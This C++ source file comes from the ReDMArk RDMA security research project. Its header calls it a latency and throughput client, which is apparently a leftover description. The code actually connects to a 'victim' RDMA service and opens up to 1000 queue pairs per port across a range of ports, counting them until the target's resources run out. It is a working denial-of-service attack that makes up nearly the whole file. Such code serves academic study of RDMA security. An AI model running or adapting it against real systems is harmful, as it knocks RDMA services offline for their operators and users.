/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Launch a client for measuring latency and throughput of RDMA operations towards an RDMA service
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */

#include "verbsEP.hpp"
#include "connectRDMA.hpp"
#include <chrono>
#include "cxxopts.hpp"
#include <thread>


cxxopts::ParseResult
parse(int argc, char* argv[])
{
    cxxopts::Options options(argv[0], "A client for measuring latency and throughput");
    options
      .positional_help("[optional args]")
      .show_positional_help();
 
  try
  {
 
    options.add_options()
      ("a,address", "IP address of the victim", cxxopts::value<std::string>(), "IP")
      ("p,port", "port of the victim", cxxopts::value<int>(), "port")
      ("help", "Print help")
     ;
 
    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    if (result.count("address") == 0 || result.count("port") == 0)
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

uint32_t totalQps = 0;

void printTotalQps() {
  std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
  std::chrono::steady_clock::time_point cur;
  while(true) {
    sleep(1);
    cur = std::chrono::steady_clock::now();
    int64_t relative = std::chrono::duration_cast<std::chrono::seconds>(cur - begin).count();
    printf("%ld\t%u\n", relative, totalQps);
    fflush(stdout);
  }
}

int main(int argc, char* argv[]){
 
  auto allparams = parse(argc,argv);

  std::string ip = allparams["address"].as<std::string>(); // "192.168.1.20"; .c_str()
  int port = allparams["port"].as<int>();

  std::thread recordingThread(printTotalQps);

  // ClientRDMA * client = new ClientRDMA(const_cast<char*>(ip.c_str()),port);
  for (int p = port; p < 9999; p++){
    ClientRDMA * client = new ClientRDMA(const_cast<char*>(ip.c_str()),p);
    struct ibv_qp_init_attr attr;
    struct rdma_conn_param conn_param;
    
    memset(&attr, 0, sizeof(attr));
    attr.cap.max_send_wr = 1;
    attr.cap.max_recv_wr = 1;
    attr.cap.max_send_sge = 1;
    attr.cap.max_recv_sge = 1;
    attr.cap.max_inline_data = 0;
    attr.qp_type = IBV_QPT_RC;

    memset(&conn_param, 0 , sizeof(conn_param));
    conn_param.responder_resources = 0;
    conn_param.initiator_depth =  0;
    conn_param.retry_count = 3;  
    conn_param.rnr_retry_count = 3;  

    VerbsEP *ep; 
    struct ibv_pd* pd = NULL;
    for (int i = 0; i < 1000; i++) {
      ep = client->connectEP(&attr,&conn_param,pd);
      if (ep == NULL) {
        printf ("Cannot request new QP, last port: %d.\n", p);
        while (true) {
          sleep(1000);
        }
      } else {
        totalQps++;
      }
    }
  }
  return 0;
}

 
 
 
